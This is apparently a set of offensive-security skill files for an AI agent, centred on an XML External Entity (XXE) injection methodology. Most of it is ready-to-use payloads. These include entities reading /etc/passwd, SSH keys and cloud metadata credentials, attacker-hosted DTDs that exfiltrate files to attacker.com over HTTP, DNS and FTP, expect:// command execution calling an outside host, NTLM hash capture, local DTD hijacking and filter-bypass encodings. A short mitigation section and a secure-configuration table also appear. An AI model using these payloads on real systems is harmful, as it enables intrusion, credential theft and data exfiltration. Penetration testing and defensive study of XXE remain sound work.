
---

## Testing Notes

- **Always start with error-based detection** — It provides the fastest confirmation and reveals query structure through error messages.
- **Union extraction is exponentially faster than blind** — Attempt union before committing to character-by-character blind extraction.
- **Enumerate counts and lengths before blind extraction** — Knowing the target size prevents infinite loops and optimizes request volume.
- **Test both GET and POST parameters** — XPath injection commonly exists in SOAP bodies, XML-RPC, REST API JSON-to-XML conversions, and search parameters.
- **Check HTTP headers** — `X-Requested-With`, custom headers, and cookies may feed into XPath queries.
- **Document the original query structure** if inferable — Understanding whether the injection is in a predicate, node test, or function argument determines payload construction.
- **Be aware of XPath version** — XPath 1.0 is far more common in legacy apps; XPath 2.0+ enables `matches()`, `if-then-else`, and richer string functions.


### From `normal-skills/xxe.md`

name: xxe-injection
description: Comprehensive XXE (XML External Entity) injection testing methodology covering basic file disclosure, blind out-of-band exfiltration, XInclude attacks, SSRF chaining, parser-specific bypasses, and advanced entity manipulation with optimized payloads and detection techniques.
version: 1.0.0
---

## Overview

XML External Entity (XXE) Injection is an attack against applications that parse XML input. When an XML parser processes a document containing a reference to an external entity, the parser may dereference that entity and expose internal files, perform SSRF, or execute remote requests. The vulnerability stems from allowing the XML parser to process external entity declarations (DTD processing) without proper restriction.

**Core XML Concepts:**
- **DTD (Document Type Definition):** Defines the structure and legal elements/attributes of an XML document
- **ENTITY:** A placeholder for content; can reference internal strings or external resources
- **Parameter Entity:** Special entity type (`%name;`) used only within DTDs, critical for blind XXE
- **General Entity:** Standard entity (`&name;`) used in document body
- **XInclude:** XML Inclusions specification allowing inclusion of external documents independent of DTD processing

**Key RFCs & Specifications:** XML 1.0 (Fifth Edition), XML Inclusions (XInclude) 1.0, RFC 7303 (XML Media Types)

---

### 1.1 Initial Vector Identification
Identify all XML ingestion points in the application:
- **Direct XML APIs:** SOAP endpoints, REST APIs accepting `application/xml` or `text/xml`, XML-RPC
- **File Uploads:** SVG images, Office documents (DOCX/XLSX/PPTX), PDF generators, image metadata parsers
- **Indirect XML Processing:** RSS/Atom feed readers, SAML authentication, configuration imports, data transformation pipelines
- **Content-Type Switching:** Endpoints accepting JSON that may parse XML if Content-Type is changed to `application/xml`
- **XMPP/WebSocket:** Messaging protocols built on XML streams

### 1.2 Parser Behavior Fingerprinting
Determine the backend parser to tailor exploitation:

**Fingerprinting Payloads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "internal">
]>
<test>&xxe;</test>
```
- If response contains `internal`, parser resolves general entities (internal)

**Protocol Support Testing:**
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR/">
]>
<test>&xxe;</test>
```
- DNS lookup = external entity resolution enabled
- HTTP request = full SSRF capability confirmed

**Parser-Specific Signatures:**
- **Java/Xerces:** `jar://`, `http://`, `file://`, `ftp://` supported; error messages often contain `com.sun.org.apache.xerces`
- **PHP/libxml2:** `file://`, `http://`, `ftp://`, `php://` supported; `libxml_disable_entity_loader()` may be present
- **.NET:** `System.Xml.XmlReader` with `DtdProcessing.Prohibit` vs `Parse`; `XmlDocument` vulnerable by default in older .NET Framework versions
- **Python/lxml:** `lxml.etree.parse()` with `resolve_entities=True` (default in older versions)
- **Ruby/Rexml:** Limited external entity support; Nokogiri uses libxml2

### 1.3 Error-Based Detection
Force parser errors to confirm XML processing and reveal paths:
```xml
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///nonexistent/">
]>
<test>&xxe;</test>
```
- File not found errors confirm `file://` access and parser type
- Java often throws `java.io.FileNotFoundException` with full path

---

### 2.1 File Disclosure
Read local files directly into the XML document response.

**Linux Targets:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**High-Value Linux Files:**
- `/etc/passwd` (user enumeration)
- `/etc/shadow` (rarely readable, test anyway)
- `/etc/hostname`, `/etc/hosts` (network reconnaissance)
- `/proc/self/environ` (environment variables, may contain credentials)
- `/proc/self/cmdline` (process arguments)
- `/proc/self/fd/0` through `/proc/self/fd/9` (file descriptors, may expose request body)
- `/proc/self/cwd/application.properties`, `/proc/self/cwd/config.xml` (application configs)
- `/var/log/apache2/access.log`, `/var/log/nginx/access.log` (log poisoning vectors)
- `/home/user/.ssh/id_rsa`, `/root/.ssh/id_rsa` (SSH keys)
- `/opt/tomcat/webapps/ROOT/WEB-INF/web.xml` (Java config)
- `/usr/share/tomcat8/conf/tomcat-users.xml` (Tomcat credentials)

**Windows Targets:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

**High-Value Windows Files:**
- `file:///C:/windows/win.ini`
- `file:///C:/windows/system32/drivers/etc/hosts`
- `file:///C:/inetpub/wwwroot/web.config` (IIS/ASP.NET config)
- `file:///C:/ProgramData/Oracle/Java/javapath/java.exe` (path validation)
- `file:///C:/Users/Administrator/ntuser.dat`
- `file:///C:/xampp/phpMyAdmin/config.inc.php` (XAMPP configs)

**PHP-Specific Wrappers:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```
- Bypasses some character restrictions by base64-encoding output

**Java-Specific Wrappers:**
```xml
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```
- Older Java versions support `netdoc://` as alias for `file://`

### 2.2 SSRF via Entity Resolution
Use the parser as an SSRF proxy to scan internal networks.

**Basic Internal Scanning:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">  <!-- AWS IMDS -->
]>
<foo>&xxe;</foo>
```

**Cloud Metadata Endpoints:**
- **AWS:** `http://169.254.169.254/latest/meta-data/`, `http://169.254.169.254/latest/user-data/`, `http://169.254.169.254/latest/dynamic/instance-identity/document`
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2017-08-01` (requires header `Metadata: true`)
- **GCP:** `http://169.254.169.254/computeMetadata/v1/` (requires header `Metadata-Flavor: Google`)
- **Oracle Cloud:** `http://169.254.169.254/opc/v1/instance/`
- **DigitalOcean:** `http://169.254.169.254/metadata/v1.json`

**Internal Service Enumeration:**
```xml
<!ENTITY xxe SYSTEM "http://internal-api:8080/health">
<!ENTITY xxe SYSTEM "http://localhost:22/">  <!-- SSH banner grabbing -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">  <!-- Redis (may hang) -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/">  <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:50070/">  <!-- Hadoop NameNode -->
```

### 2.3 Remote Code Execution Vectors

**PHP expect:// Wrapper:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```
- Requires PHP `expect` extension installed (rare in production but high impact)
- Chainable: `expect://curl%20http://attacker.com/$(id|base64)`

**Java jar:// Protocol:**
```xml
<!ENTITY xxe SYSTEM "jar:http://attacker.com/malicious.jar!/file.txt">
```
- Java attempts to download and process the JAR, may execute code in some deserialization contexts

**Java netdoc:// for Path Traversal:**
```xml
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

**PHP php://input Wrapper (Write Contexts):**
If the XML is used to construct a file path or is written to a file:
```xml
<!ENTITY xxe SYSTEM "php://input">
```
- Rare in XXE contexts but possible in XML-to-file transformations

---

## Phase 3: Blind XXE & Out-of-Band Exfiltration

When the parser does not return entity content in the response, use out-of-band (OOB) techniques to exfiltrate data.

### 3.1 Parameter Entity Fundamentals
Parameter entities (`%name;`) are defined and used within the DTD. They are essential for blind XXE because:
- They can be used in `ENTITY` declarations where general entities cannot
- They enable recursive DTD loading from attacker-controlled servers

### 3.2 Out-of-Band Data Exfiltration

**Setup:** Host a malicious DTD on your server (`http://attacker.com/exfil.dtd`):

```xml
<!-- exfil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Injection Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">
  %xxe;
]>
<foo></foo>
```

**Execution Flow:**
1. Target parser fetches `exfil.dtd` from attacker server
2. Parser defines `%file` as contents of `/etc/passwd`
3. `%eval` defines another parameter entity `%exfil` with URL containing file contents
4. `%exfil` triggers HTTP request to attacker server with file contents in query string

**URL Encoding Considerations:**
- If the file contains newlines or spaces, URL-encode the payload or use FTP instead of HTTP
- Some parsers strip newlines; use `php://filter/convert.base64-encode/resource=` to ensure safe transport

**Base64-Encoded Exfiltration (Recommended):**
```xml
<!-- exfil.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### 3.3 Error-Based Exfiltration
Force the parser to throw an error containing the target file contents.

**Malicious DTD:**
```xml
<!-- error.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

**Result:** Parser attempts to open path `/nonexistent/root:x:0:0...` and throws `FileNotFoundException` containing the file contents.

**Java-Specific Error Extraction:**
Java parsers often include the full path in `java.io.FileNotFoundException`, making this highly reliable.

### 3.4 DNS Exfiltration (For Restricted Environments)
When HTTP is blocked but DNS resolution is allowed:

```xml
<!-- dns.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%file;.attacker.com/'>">
%eval;
%exfil;
```

**Limitations:** DNS labels max 63 characters, full domain max 253 characters. Use for small secrets (API keys, tokens) or chunk data via multiple requests.

**DNS Chunking Technique:**
For larger files, use multiple entities and Java substring methods (if XSLT/XPath available) or exfiltrate line-by-line.

### 3.5 FTP Exfiltration
Some parsers support FTP and handle binary/newline data better than HTTP:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%file;'>">
```

**Setup:** Run an FTP listener (e.g., `python -m pyftpdlib -p 2121`) to capture full file contents including newlines.

---

## Phase 4: XInclude & Alternative Vectors

When DTD processing is disabled but XInclude is supported, or when you cannot control the full XML document.

### 4.1 XInclude Attacks
XInclude is processed at a different layer than DTD entity expansion and may be enabled when DTDs are disabled.

**Basic XInclude Payload:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</foo>
```

**XInclude with Text Parsing:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

**XInclude SSRF:**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://internal-api:8080/admin"/>
</foo>
```

**XInclude with XPointer:**
```xml
<xi:include href="file:///etc/passwd" xpointer="xpointer(/passwd/user[1])"/>
```

**Context Requirements:**
- The XML element must allow child elements or the parser must accept arbitrary XInclude namespaces
- Common in document processing pipelines (DocBook, DITA, custom XML configs)

### 4.2 SVG Upload XXE
SVG files are XML documents. Upload points expecting images often use XML parsers.

**SVG XXE Payload:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100px" height="100px" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">&xxe;</text>
</svg>
```

**Blind SVG XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">
  %xxe;
]>
<svg width="100px" height="100px" xmlns="http://www.w3.org/2000/svg">
  <text x="10" y="20">test</text>
</svg>
```

**SVG via XInclude:**
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd"/>
</svg>
```

### 4.3 Office Document XXE (DOCX/XLSX/PPTX)
Office Open XML formats are ZIP archives containing XML files. Inject XXE into `word/document.xml`, `xl/workbook.xml`, or `ppt/presentation.xml`.

**Methodology:**
1. Unzip the document: `unzip document.docx -d docx_extracted/`
2. Edit `word/document.xml` and add the XXE payload after the XML declaration
3. Re-zip ensuring directory structure is preserved: `cd docx_extracted && zip -r ../malicious.docx .`
4. Upload the document

**Payload in word/document.xml:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document ...>
  <w:body>
    <w:p>
      <w:r>
        <w:t>&xxe;</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>
```

**Blind Variant:**
Use parameter entities pointing to your DTD in `[Content_Types].xml` or `_rels/.rels` if the parser processes those.

### 4.4 PDF Generation XXE
Some PDF generators accept HTML/XML input (e.g., PDF converters, report generators).

**Common Vulnerable Scenarios:**
- HTML-to-PDF with `<?xml version="1.0"?>` processing
- XSL-FO to PDF pipelines
- ReportLab or similar libraries processing XML data sources

**Test Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<html>
  <body>
    <p>&xxe;</p>
  </body>
</html>
```

### 4.5 SOAP Web Services
SOAP envelopes are XML by definition and frequently vulnerable.

**SOAP Body Injection:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <foo>&xxe;</foo>
  </soap:Body>
</soap:Envelope>
```

**WSDL Parsing:**
If the application fetches and parses WSDL files:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<definitions ...>
  <documentation>&xxe;</documentation>
</definitions>
```

### 4.6 SAML Authentication
SAML assertions are XML documents processed by identity providers/service providers.

**SAML XXE Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<saml:Assertion ...>
  <saml:Subject>
    <saml:NameID>&xxe;</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

**Target:** Look for SAML SSO endpoints, SAML metadata parsers, and SAML response validators.

---

### 5.1 Encoding & Obfuscation
Bypass input filters and WAFs using XML encoding features.

**UTF-7 Encoding (Legacy IE/XML Parsers):**
```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo+AD4-
+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-
+ADw-foo+AD4-&xxe;+ADw-/foo+AD4-
```

**ISO-8859-1 / Windows-1252:**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
```

**HTML Entities in DTD:**
```xml
<!ENTITY xxe SYSTEM "file&#58;&#47;&#47;&#47;etc&#47;passwd">
```

**Mixed Case & Whitespace:**
XML is case-sensitive but DTD parsing allows whitespace variations:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```
vs
```xml
<!DOCTYPE foo [
  <!ENTITY
    xxe
    SYSTEM
    "file:///etc/passwd"
  >
]>
```

### 5.2 DTD Bypass Techniques
When `DOCTYPE` is blocked but entity processing remains.

**Internal Entity Only:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<foo>&xxe;</foo>
```
- Confirms entity processing without external resolution

**Using Existing DTDs (Local DTD Hijacking):**
When external connections are blocked but internal DTDs exist (common in Java):

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ENTITY aaa "bbb"'>
  %local_dtd;
]>
<foo></foo>
```

**Execution:** The parser loads the local DTD, your injected parameter entity redefines an existing entity in that DTD, and the error-based exfiltration triggers.

**Known Local DTDs by Platform:**
- **Linux/Java:** `/usr/share/xml/fontconfig/fonts.dtd`, `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`
- **macOS:** `/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/DictionaryServices.framework/Versions/A/Resources/AppleDictionarySchema.dtd`
- **Windows:** `file:///C:/Windows/system32/wbem/xml/wmi20.dtd`

### 5.3 Protocol Bypasses
When `file://` is blocked but other protocols work.

**PHP Wrappers:**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">
```

**Java-Specific:**
```xml
<!ENTITY xxe SYSTEM "jar:file:///etc/passwd!/test.txt">  <!-- May work in some contexts -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
<!ENTITY xxe SYSTEM "classpath:///com/example/config.properties">
```

**Windows UNC Paths:**
```xml
<!ENTITY xxe SYSTEM "\\attacker.com\share\test">
<!ENTITY xxe SYSTEM "file://attacker.com/share/test">
```
- Forces NTLM authentication hash disclosure to attacker SMB server

### 5.4 Recursive Entity Expansion (Billion Laughs)
While primarily a DoS vector, can be used for detection:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```
- If the parser hangs or throws memory errors, DTD processing is enabled

### 5.5 Content-Type Switching & Format Confusion
Test endpoints that normally accept JSON by switching to XML:

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
  <username>&xxe;</username>
  <password>test</password>
</login>
```

**Alternative Content-Types to Test:**
- `application/xml`
- `text/xml`
- `application/soap+xml`
- `application/xhtml+xml`
- `application/atom+xml`

### 5.6 XML Bomb + XXE Hybrid
Combine DoS detection with XXE to confirm parser capabilities without waiting for OOB callbacks:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY a0 "dos" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <test>&a2;</test>
  <test2>&xxe;</test2>
</data>
```

---

### 6.1 Internal Network Mapping
Use the XXE as an SSRF pivot to map the internal network:

```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1/">
<!ENTITY xxe SYSTEM "http://192.168.1.2/">
<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">
```

**Automation:** Create a list of common internal IPs and ports, use parameter entities to iterate (or use blind OOB with unique subdomains per target).

### 6.2 Cloud Credential Harvesting
Target cloud metadata services for IAM credentials:

**AWS IMDSv1 (if enabled):**
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

**AWS IMDSv2 (token required):**
IMDSv2 is generally safe from simple XXE because it requires a PUT request for the token, but test for SSRF chaining if the application makes subsequent requests.

### 6.3 Source Code Disclosure
Read application source to find additional vulnerabilities:

**Java:**
```xml
<!ENTITY xxe SYSTEM "file:///opt/tomcat/webapps/ROOT/WEB-INF/classes/com/example/AdminController.class">
<!ENTITY xxe SYSTEM "jar:file:///opt/tomcat/webapps/ROOT/WEB-INF/lib/application.jar!/BOOT-INF/classes/application.properties">
```

**PHP:**
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
```

**.NET:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/bin/Application.dll">
<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/appsettings.json">
```

### 6.4 NTLM Hash Capture (Windows Environments)
Force Windows parser to authenticate to attacker SMB server:

```xml
<!ENTITY xxe SYSTEM "\\attacker.com\share">
<!ENTITY xxe SYSTEM "file://attacker.com/share">
```

**Setup:** Use `Responder.py`, `impacket-smbserver`, or `ntlmrelayx` to capture hashes.

### 6.5 XSLT Injection Chaining
If the XML is transformed via XSLT, XXE may lead to XSLT injection:

```xml
<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/malicious.xsl"?>
<foo></foo>
```

**malicious.xsl:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```

---

### 7.1 Secure Configuration Checklist
Verify the following mitigations are properly implemented:

**Disable External Entities:**
- **Java:** `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` or `setFeature("http://xml.org/sax/features/external-general-entities", false)` + `external-parameter-entities`
- **PHP:** `libxml_disable_entity_loader(true)` (PHP < 8.0); in PHP 8.0+ libxml2 2.9.0+ disables by default
- **.NET:** `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` or `DtdProcessing.Ignore`
- **Python/lxml:** `lxml.etree.parse(source, forbid_entities=True, forbid_external=True)`
- **Ruby/Nokogiri:** `Nokogiri::XML::ParseOptions::NOENT` and `NONET` flags

**Disable XInclude:**
- **libxml2:** `XML_PARSE_NOXINCNODE` flag
- **Java:** Ensure XInclude processing is not enabled via `setXIncludeAware(true)`

**Input Validation:**
- Reject `DOCTYPE` declarations entirely if XML is not strictly required
- Use JSON instead of XML for data interchange where possible
- Implement strict allowlists for expected XML structure

### 7.2 Verification Payloads
Test that mitigations are effective:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/verify">
]>
<foo>&xxe;</foo>
```
- No OOB callback = external entities blocked

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://attacker.com/verify"/>
</foo>
```
- No OOB callback = XInclude disabled

### 7.3 Regression Testing
After reported fixes, verify:
- File disclosure on all previously vulnerable endpoints
- Blind XXE via OOB on all parsers
- XInclude on upload points
- Content-Type switching still rejected or safely parsed
- Office document processing sanitized or DTD-disabled

---

### A.2 Blind OOB (Base64)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/exfil.dtd">%xxe;]>
<foo/>
```

**exfil.dtd:**
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

### A.3 Error-Based
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]>
<foo/>
```

### A.4 XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
```

### A.5 SVG Upload
```xml
<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

---

## Appendix B: Testing Checklist

- [ ] Identify all XML ingestion points (APIs, uploads, SOAP, SAML, RSS)
- [ ] Fingerprint backend XML parser and version
- [ ] Test for in-band file disclosure (`file:///etc/passwd`, `file:///C:/windows/win.ini`)
- [ ] Test for SSRF via entity resolution (cloud metadata, internal services)
- [ ] Test for blind XXE with OOB exfiltration (parameter entities + attacker DTD)
- [ ] Test for error-based exfiltration (local DTD hijacking if OOB blocked)
- [ ] Test XInclude when DTD is disabled
- [ ] Test SVG upload points with XXE payloads
- [ ] Test Office document upload/processing with injected XML
- [ ] Test Content-Type switching from JSON to XML
- [ ] Test for RCE vectors (`expect://`, `jar://`, XSLT chaining)
- [ ] Test for NTLM hash capture in Windows environments
- [ ] Verify WAF/filter bypass using encoding and obfuscation
- [ ] Verify local DTD hijacking when external connections are blocked
- [ ] Document all findings with specific payloads, endpoints, and impact
- [ ] Provide remediation guidance with secure parser configuration examples

---

## Appendix C: Common Vulnerable Libraries & Frameworks

| Technology | Library/Class | Default Behavior | Secure Configuration |
|------------|---------------|------------------|----------------------|
| Java | `DocumentBuilderFactory` | External entities enabled | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` |
| Java | `SAXParserFactory` | External entities enabled | Same as above |
| Java | `XMLReader` | External entities enabled | `setFeature("http://xml.org/sax/features/external-general-entities", false)` |
| Java | `TransformerFactory` | XSLT may enable XXE | `setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "")` |
| PHP | `DOMDocument` | libxml2 dependent | `libxml_disable_entity_loader(true)` (legacy) |
| PHP | `simplexml_load_string()` | libxml2 dependent | Use `LIBXML_NONET` and `LIBXML_NOENT` carefully |
| .NET | `XmlDocument` | DTD processing enabled | `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` |
| .NET | `XmlReader` | DTD processing enabled | `XmlReaderSettings.DtdProcessing = DtdProcessing.Ignore` |
| Python | `lxml.etree` | External entities enabled | `resolve_entities=False`, `no_network=True` |
| Python | `xml.etree.ElementTree` | Safe (no external entities) | Default is safe |
| Ruby | `Nokogiri::XML` | External entities enabled | `Nokogiri::XML::ParseOptions::NONET` |

---

## Appendix D: Tools & Infrastructure

**Required Infrastructure:**
- Burp Suite Professional with Collaborator (for OOB detection)
- Interactsh (OOB callback server)
- Custom HTTP/FTP/DNS server for exfiltration
- `Responder.py` for NTLM hash capture
- `impacket-smbserver` for SMB hash capture

**Useful Commands:**
```bash


### From `offensive-skills/offensive-xxe/SKILL.md`

## Metadata
- **Skill Name**: xxe
- **Folder**: offensive-xxe
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/xxe.md

## Description
XML External Entity injection testing checklist: classic XXE, blind XXE (out-of-band), XXE via file upload (SVG/docx), XXE in SOAP/REST, error-based XXE, XInclude attacks, and XXE filter bypass. Use for web app XXE testing and bug bounty.

## Trigger Phrases
Use this skill when the conversation involves any of:
`XXE, XML external entity, blind XXE, out-of-band XXE, XXE file upload, SVG XXE, SOAP XXE, XInclude, entity bypass, XXE SSRF, XXE file read`

## Shortcut

- Find data entry points that you can use to submit XML data.
- Determine whether the entry point is a candidate for a classic or blind XXE. The endpoint might be vulnerable to classic XXE if it returns the parsed XML data in the HTTP response. If the endpoint does not return results, it might still be vulnerable to blind XXE, and you should set up a callback listener for your tests.
- Try out a few test payloads to see if the parser is improperly configured. In the case of classic XXE, you can check whether the parser is processing external entities. In the case of blind XXE, you can make the server send requests to your callback listener to see if you can trigger outbound interaction.
- Try to exfiltrate a common system file, like /etc/hostname.
- You can also try to retrieve some more sensitive system files, like /etc/shadow or ~/.bash_history.
- If you cannot exfiltrate the entire file with a simple XXE payload, try to use an alternative data exfiltration method.
- See if you can launch an SSRF attack using the XXE.

## Mechanisms

XML External Entity (XXE) is a vulnerability that occurs when XML parsers process external entity references within XML documents. XXE attacks target applications that parse XML input and can lead to:

- Disclosure of confidential files and data
- Server-side request forgery (SSRF)
- Denial of service attacks
- Remote code execution in some cases

```mermaid
flowchart TD
    A[XXE Vulnerability] --> B[File Disclosure]
    A --> C[SSRF]
    A --> D[Denial of Service]
    A --> E[Remote Code Execution]

    B -->|"Access to"| B1[System Files]
    B -->|"Access to"| B2[Application Configs]
    B -->|"Access to"| B3[Database Credentials]

    C -->|"Access to"| C1[Internal Services]
    C -->|"Access to"| C2[Cloud Metadata]
    C -->|"Access to"| C3[External Resources]

    D -->|"Via"| D1[Billion Laughs]
    D -->|"Via"| D2[Quadratic Blowup]
    D -->|"Via"| D3[External Resource DoS]

    E -->|"Via"| E1[PHP Expect]
    E -->|"Via"| E2[Java Deserialization]
```

